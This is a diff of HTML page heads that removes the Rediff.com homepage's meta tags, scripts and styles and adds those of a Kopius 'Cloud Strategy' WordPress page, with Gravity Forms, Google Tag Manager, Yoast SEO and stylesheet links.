@@ -1,1758 +1,794 @@
+
 <!doctype html>
-<html lang="en">
-    <head>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
-        <meta name="format-detection" content="telephone=no"/>
-        <meta name="viewport" content="width=device-width, initial-scale=1"/>
-        <title>Rediff.com: News | Rediffmail | Stock Quotes | Shopping</title>
-        <meta name="keywords" content="Latest India News, Rediffmail, Live Stock Updates, Share Market Advice, Mutual Fund Quotes, Stock Quotes, Share price, Free email, Live Cricket Score, Sports News, Bollywood News, Movie Review, Rediff Money, Wealth Management, Sensex, Moneywiz, Rediffmail Login, iShare, Shopping, Business Email, Rediff, Bollywood, Bollywood Gossip, Getahead"/>
-        <meta name="description" content="&#10004;Read Latest India News &#10004;Get Realtime Stock Quotes &#10004;See Live Cricket Scores &#10004;Log in to Rediffmail &#10004;Buy Smart Products on Rediff Shopping"/>
-        <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
-        <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.rediff.com"/>
-        <link rel="canonical" href="https://www.rediff.com"/>
-        <link rel="preconnect" href="//imworld.rediff.com">
-        <link rel="preconnect" href="//im.rediff.com">
-        <link rel="preconnect" href="//imshopping.rediff.com">
-        <link rel="preconnect" href="//datastore.rediff.com">
-        <link rel="preconnect" href="//socialimg.rediff.com">
-        <link rel="preconnect" href="//newsimg.rediff.com">
-        <link rel="dns-prefetch" href="//track.rediff.com/">
-        <link rel="dns-prefetch" href="//bizmail.rediff.com/">
-        <link rel="dns-prefetch" href="//businessemail.rediff.com/">
-        <link rel="dns-prefetch" href="//workmail.rediff.com/">
-        <link rel="shortcut icon" type=image/x-icon href="//im.rediff.com/favicon.ico"/>
-        <link rel="stylesheet" href="//imworld.rediff.com/worldrediff/style_3_16/home_tile_ind_65.css" media="screen"/>
-        <script>
-            document.domain = "rediff.com";
-            var glb_script_load = 0;
-            var glb_citymapped = 0;
-            var endyear = "2023";
-            var loggedin = "";
-            var totalfeaturedpages = "9";
-            var totsmartTrnd = "30";
-            var totsmartBest = "25";
-            var pages_domain = "http://pages.rediff.com";
-            var cdn_domain = "https://www.rediff.com";
-            var org_domain = "http://mypage.rediff.com";
-            var ishare_domain = "https://ishare.rediff.com";
-            var shopping_domain = "https://shopping.rediff.com";
-            var books_domain = "http://books.rediff.com";
-            var track_domain = "https://track.rediff.com";
-            var money_domain = "https://money.rediff.com";
-            var realtime_domain = "https://realtime.rediff.com";
-            var share_domain = "http://share.rediff.com";
-            var imgpath = "//imworld.rediff.com/worldrediff/pix";
-            var srch_tab_sel = "shopping";
-            //used in sns
-            var srch_tab_num = 0;
-            //used in sns
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+<script>
+var gform;gform||(document.addEventListener("gform_main_scripts_loaded",function(){gform.scriptsLoaded=!0}),window.addEventListener("DOMContentLoaded",function(){gform.domLoaded=!0}),gform={domLoaded:!1,scriptsLoaded:!1,initializeOnLoaded:function(o){gform.domLoaded&&gform.scriptsLoaded?o():!gform.domLoaded&&gform.scriptsLoaded?window.addEventListener("DOMContentLoaded",o):document.addEventListener("gform_main_scripts_loaded",o)},hooks:{action:{},filter:{}},addAction:function(o,n,r,t){gform.addHook("action",o,n,r,t)},addFilter:function(o,n,r,t){gform.addHook("filter",o,n,r,t)},doAction:function(o){gform.doHook("action",o,arguments)},applyFilters:function(o){return gform.doHook("filter",o,arguments)},removeAction:function(o,n){gform.removeHook("action",o,n)},removeFilter:function(o,n,r){gform.removeHook("filter",o,n,r)},addHook:function(o,n,r,t,i){null==gform.hooks[o][n]&&(gform.hooks[o][n]=[]);var e=gform.hooks[o][n];null==i&&(i=n+"_"+e.length),gform.hooks[o][n].push({tag:i,callable:r,priority:t=null==t?10:t})},doHook:function(n,o,r){var t;if(r=Array.prototype.slice.call(r,1),null!=gform.hooks[n][o]&&((o=gform.hooks[n][o]).sort(function(o,n){return o.priority-n.priority}),o.forEach(function(o){"function"!=typeof(t=o.callable)&&(t=window[t]),"action"==n?t.apply(null,r):r[0]=t.apply(null,r)})),"filter"==n)return r[0]},removeHook:function(o,n,t,i){var r;null!=gform.hooks[o][n]&&(r=(r=gform.hooks[o][n]).filter(function(o,n,r){return!!(null!=i&&i!=o.tag||null!=t&&t!=o.priority)}),gform.hooks[o][n]=r)}});
+</script>
 
-            function trackURL(url) {
-                var tmpurl = url.split("___");
-                if (tmpurl[1]) {
-                    url = decodeURIComponent(tmpurl[1]);
-                }
-                if (navigator.userAgent.toLowerCase().indexOf('msie') != -1) {
-                    var referLink = document.createElement('a');
-                    referLink.href = url;
-                    document.body.appendChild(referLink);
-                    referLink.click();
-                } else {
-                    document.location.href = url;
-                }
-            }
-            function trackGuruURL(url) {
-                if (navigator.userAgent.toLowerCase().indexOf('msie') != -1) {
-                    var referLink = document.createElement('a');
-                    referLink.href = url;
-                    document.body.appendChild(referLink);
-                    referLink.click();
-                } else {
-                    document.location.href = url;
-                }
-            }
-            function getCookie(name) {
-                var dc = document.cookie;
-                var prefix = name + "=";
-                var begin = dc.indexOf("; " + prefix);
-                if (begin == -1) {
-                    begin = dc.indexOf(prefix);
-                    if (begin != 0)
-                        return null
-                } else
-                    begin += 2;
-                var end = document.cookie.indexOf(";", begin);
-                if (end == -1)
-                    end = dc.length;
-                return unescape(dc.substring(begin + prefix.length, end))
-            }
-        </script>
-        <script async src="//newads.rediff.com/rediffadserver/www/delivery/asyncjs.php"></script>
-        <style>
-            .navbar {
-                position: sticky;
-                top: 0;
-                z-index: 100;
-            }
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
 
-            .div_subscribe_nl {
-                display: none;
-                position: absolute;
-                right: 135px;
-                top: 30px;
-                background: #fff;
-                background: rgba(255,255,255,0.9);
-                width: 320px;
-                min-height: 90px;
-                border: solid 3px #444444;
-                z-index: 101;
-                text-align: left;
-                overflow: hidden;
-                padding-bottom: 15px;
-            }
+	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
 
-            .subnews_icon {
-                position: absolute;
-                right: 270px;
-                top: 1px;
-                width: 29px;
-                height: 30px;
-                z-index: 1;
-                background: url('https://imworld.rediff.com/worldrediff/pix/sub-news-icon.png') no-repeat -60px -6px;
-                cursor: pointer;
-            }
+<!-- Google Tag Manager for WordPress by gtm4wp.com -->
+<script data-cfasync="false" data-pagespeed-no-defer>
+	var gtm4wp_datalayer_name = "dataLayer";
+	var dataLayer = dataLayer || [];
+</script>
+<!-- End Google Tag Manager for WordPress by gtm4wp.com -->
+	<!-- This site is optimized with the Yoast SEO plugin v20.3 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Cloud Strategy - Kopius</title>
+	<meta name="description" content="Understand your current ecosystem and use our cloud expertise to define how to move your business from yesterday’s to tomorrow’s cloud-forward world. Step into the future equipped with the full power of the cloud." />
+	<link rel="canonical" href="https://kopiustech.com/capabilities/cloud-strategy/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Cloud Strategy - Kopius" />
+	<meta property="og:description" content="Understand your current ecosystem and use our cloud expertise to define how to move your business from yesterday’s to tomorrow’s cloud-forward world. Step into the future equipped with the full power of the cloud." />
+	<meta property="og:url" content="https://kopiustech.com/capabilities/cloud-strategy/" />
+	<meta property="og:site_name" content="Kopius" />
+	<meta property="article:modified_time" content="2023-03-17T21:25:23+00:00" />
+	<meta property="og:image" content="https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:site" content="@valencelevel" />
+	<meta name="twitter:label1" content="Est. reading time" />
+	<meta name="twitter:data1" content="1 minute" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://kopiustech.com/capabilities/cloud-strategy/","url":"https://kopiustech.com/capabilities/cloud-strategy/","name":"Cloud Strategy - Kopius","isPartOf":{"@id":"https://kopiustech.com/#website"},"primaryImageOfPage":{"@id":"https://kopiustech.com/capabilities/cloud-strategy/#primaryimage"},"image":{"@id":"https://kopiustech.com/capabilities/cloud-strategy/#primaryimage"},"thumbnailUrl":"https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg","datePublished":"2021-07-01T02:45:45+00:00","dateModified":"2023-03-17T21:25:23+00:00","description":"Understand your current ecosystem and use our cloud expertise to define how to move your business from yesterday’s to tomorrow’s cloud-forward world. Step into the future equipped with the full power of the cloud.","breadcrumb":{"@id":"https://kopiustech.com/capabilities/cloud-strategy/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://kopiustech.com/capabilities/cloud-strategy/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://kopiustech.com/capabilities/cloud-strategy/#primaryimage","url":"https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg","contentUrl":"https://kopiustech.com/wp-content/uploads/2023/03/AdobeStock_71060373-magentifyHDx-edited.jpg","width":1667,"height":1667},{"@type":"BreadcrumbList","@id":"https://kopiustech.com/capabilities/cloud-strategy/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://kopiustech.com/"},{"@type":"ListItem","position":2,"name":"Capabilities","item":"https://kopiustech.com/capabilities/"},{"@type":"ListItem","position":3,"name":"Cloud Strategy"}]},{"@type":"WebSite","@id":"https://kopiustech.com/#website","url":"https://kopiustech.com/","name":"Kopius","description":"","publisher":{"@id":"https://kopiustech.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://kopiustech.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://kopiustech.com/#organization","name":"Kopius","url":"https://kopiustech.com/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://kopiustech.com/#/schema/logo/image/","url":"https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark.png","contentUrl":"https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark.png","width":1140,"height":280,"caption":"Kopius"},"image":{"@id":"https://kopiustech.com/#/schema/logo/image/"},"sameAs":["https://twitter.com/valencelevel"]}]}</script>
+	<!-- / Yoast SEO plugin. -->
 
-            .div_subscribe_nl form {
-                padding: 10px 15px 5px 15px;
-                font-size: 16px;
-                white-space: nowrap;
-                font-weight: bold;
-            }
 
-            .getnews {
-                color: #b30808;
-            }
+<link rel='dns-prefetch' href='//www.google.com' />
+<link rel="alternate" type="application/rss+xml" title="Kopius &raquo; Feed" href="https://kopiustech.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Kopius &raquo; Comments Feed" href="https://kopiustech.com/comments/feed/" />
+<script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/kopiustech.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=1679091487"}};
+/*! This file is auto-generated */
+!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode,e=(p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0),i.toDataURL());return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(p&&p.fillText)switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([129777,127995,8205,129778,127999],[129777,127995,8203,129778,127999])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
+</script>
+<style>
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 0.07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='gravity_forms_theme_reset-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/gravity-forms-theme-reset.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='gravity_forms_theme_foundation-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/gravity-forms-theme-foundation.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='gravity_forms_theme_framework-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/gravity-forms-theme-framework.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='gravity_forms_orbital_theme-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/gravity-forms-orbital-theme.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='wp-block-library-css' href='https://kopiustech.com/wp-includes/css/dist/block-library/style.min.css?ver=1679091487' media='all' />
+<link rel='stylesheet' id='case_studies_block-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/case-studies-block/dist/blocks.style.build.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='crown_client_honeycomb-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/crown-client-honeycomb/dist/blocks.style.build.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='crown_connect-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/crown-connect/dist/blocks.style.build.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='crown_header-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/crown-header/dist/blocks.style.build.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='crown_image_hover-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/crown-image-hover/dist/blocks.style.build.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='crown_studios-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/crown-studios/dist/blocks.style.build.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='gradient_divider-cgb-style-css-css' href='https://kopiustech.com/wp-content/plugins/gradient-divider/dist/blocks.style.build.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='fontawesome-free-css' href='https://kopiustech.com/wp-content/plugins/getwid/vendors/fontawesome-free/css/all.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='slick-css' href='https://kopiustech.com/wp-content/plugins/getwid/vendors/slick/slick/slick.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='slick-theme-css' href='https://kopiustech.com/wp-content/plugins/getwid/vendors/slick/slick/slick-theme.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='fancybox-css' href='https://kopiustech.com/wp-content/plugins/getwid/vendors/fancybox/jquery.fancybox.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='getwid-blocks-css' href='https://kopiustech.com/wp-content/plugins/getwid/assets/css/blocks.style.css?ver=1679091486' media='all' />
+<style id='getwid-blocks-inline-css'>
+.wp-block-getwid-section .wp-block-getwid-section__wrapper .wp-block-getwid-section__inner-wrapper{max-width: 1160px;}
+</style>
+<link rel='stylesheet' id='classic-theme-styles-css' href='https://kopiustech.com/wp-includes/css/classic-themes.min.css?ver=1679091487' media='all' />
+<style id='global-styles-inline-css'>
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
+</style>
+<style id='wpxpo-global-style-inline-css'>
+:root {
+			--preset-color1: #037fff;
+			--preset-color2: #026fe0;
+			--preset-color3: #071323;
+			--preset-color4: #132133;
+			--preset-color5: #34495e;
+			--preset-color6: #787676;
+			--preset-color7: #f0f2f3;
+			--preset-color8: #f8f9fa;
+			--preset-color9: #ffffff;
+			}
+</style>
+<link rel='stylesheet' id='ultp-style-css' href='https://kopiustech.com/wp-content/plugins/ultimate-post/assets/css/style.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='dashicons-css' href='https://kopiustech.com/wp-includes/css/dashicons.min.css?ver=1679091487' media='all' />
+<link rel='stylesheet' id='wpmm_fontawesome_css-css' href='https://kopiustech.com/wp-content/plugins/wp-megamenu/assets/font-awesome-4.7.0/css/font-awesome.min.css?ver=1679091487' media='all' />
+<link rel='stylesheet' id='wpmm_icofont_css-css' href='https://kopiustech.com/wp-content/plugins/wp-megamenu/assets/icofont/icofont.min.css?ver=1679091487' media='all' />
+<link rel='stylesheet' id='wpmm_css-css' href='https://kopiustech.com/wp-content/plugins/wp-megamenu/assets/css/wpmm.css?ver=1679091487' media='all' />
+<link rel='stylesheet' id='wp_megamenu_generated_css-css' href='https://kopiustech.com/wp-content/uploads/wp-megamenu/wp-megamenu.css?ver=1679089918' media='all' />
+<link rel='stylesheet' id='featuresbox_css-css' href='https://kopiustech.com/wp-content/plugins/wp-megamenu/addons/wpmm-featuresbox/wpmm-featuresbox.css?ver=1679091487' media='all' />
+<link rel='stylesheet' id='postgrid_css-css' href='https://kopiustech.com/wp-content/plugins/wp-megamenu/addons/wpmm-gridpost/wpmm-gridpost.css?ver=1679091487' media='all' />
+<link rel='stylesheet' id='search-filter-plugin-styles-css' href='https://kopiustech.com/wp-content/plugins/search-filter-pro/public/assets/css/search-filter.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='weglot-css-css' href='https://kopiustech.com/wp-content/plugins/weglot/dist/css/front-css.css?ver=1679091486' media='' />
+<link rel='stylesheet' id='new-flag-css-css' href='https://kopiustech.com/wp-content/plugins/weglot/app/styles/new-flags.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='odometer-theme-default-css' href='https://kopiustech.com/wp-content/themes/valence/lib/odometer/odometer-theme-default.css?ver=1679091487' media='all' />
+<link rel='stylesheet' id='valence-style-css' href='https://kopiustech.com/wp-content/themes/valence/style.css?b-modified=1679091487&#038;ver=1679091487' media='all' />
+<link rel='stylesheet' id='valence-custom-css' href='https://kopiustech.com/wp-content/themes/valence/assets/css/custom.css?ver=1680539793' media='all' />
+<link rel='stylesheet' id='gform_basic-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/basic.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='gform_theme_components-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/theme-components.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='gform_theme_ie11-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/theme-ie11.min.css?ver=1679091486' media='all' />
+<link rel='stylesheet' id='gform_theme-css' href='https://kopiustech.com/wp-content/plugins/gravityforms/assets/css/dist/theme.min.css?ver=1679091486' media='all' />
+<script src='https://kopiustech.com/wp-includes/js/jquery/jquery.min.js?ver=1679091487' id='jquery-core-js'></script>
+<script src='https://kopiustech.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1679091487' id='jquery-migrate-js'></script>
+<script src='https://kopiustech.com/wp-content/plugins/wp-megamenu/addons/wpmm-featuresbox/wpmm-featuresbox.js?ver=1679091487' id='featuresbox-style-js'></script>
+<script id='postgrid-style-js-extra'>
+var postgrid_ajax_load = {"ajax_url":"https:\/\/kopiustech.com\/wp-admin\/admin-ajax.php","redirecturl":"https:\/\/kopiustech.com\/"};
+</script>
+<script src='https://kopiustech.com/wp-content/plugins/wp-megamenu/addons/wpmm-gridpost/wpmm-gridpost.js?ver=1679091487' id='postgrid-style-js'></script>
+<script id='search-filter-plugin-build-js-extra'>
+var SF_LDATA = {"ajax_url":"https:\/\/kopiustech.com\/wp-admin\/admin-ajax.php","home_url":"https:\/\/kopiustech.com\/","extensions":[]};
+</script>
